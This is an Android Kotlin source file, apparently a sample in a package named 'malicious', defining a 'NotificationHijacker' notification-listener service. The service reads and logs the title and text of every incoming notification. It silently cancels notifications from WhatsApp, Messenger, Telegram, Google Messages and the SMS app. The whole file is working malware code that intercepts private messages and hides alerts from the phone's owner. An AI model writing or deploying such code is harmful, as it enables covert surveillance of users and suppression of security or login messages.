package com.example.wildliferescuer.malicious

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log

class NotificationHijacker : NotificationListenerService() {

    companion object {
        private const val TAG = "NotificationHijacker"
    }

    override fun onCreate() {
        super.onCreate()
        Log.e(TAG, "NotificationHijacker service created")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        val packageName = sbn.packageName
        val extras = sbn.notification.extras
        val originalTitle = extras.getString(Notification.EXTRA_TITLE, "")
        val originalText = extras.getString(Notification.EXTRA_TEXT, "")

        Log.e(TAG, "Notification from: $packageName")
        Log.e(TAG, "Original Title: $originalTitle")
        Log.e(TAG, "Original Text: $originalText")

        // Target apps (messaging apps)
        val targetApps = listOf(
            "com.whatsapp",
            "com.facebook.orca",          // Messenger
            "com.google.android.apps.messaging",  // Google Messages
            "com.android.mms",            // Default SMS app
            "org.telegram.messenger",      // Telegram
        )

        if (targetApps.contains(packageName)) {
            // Cancel the original notification (hide it)
            cancelNotification(sbn.key)
            Log.e(TAG, "Cancelled original notification from $packageName")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Not needed
    }
}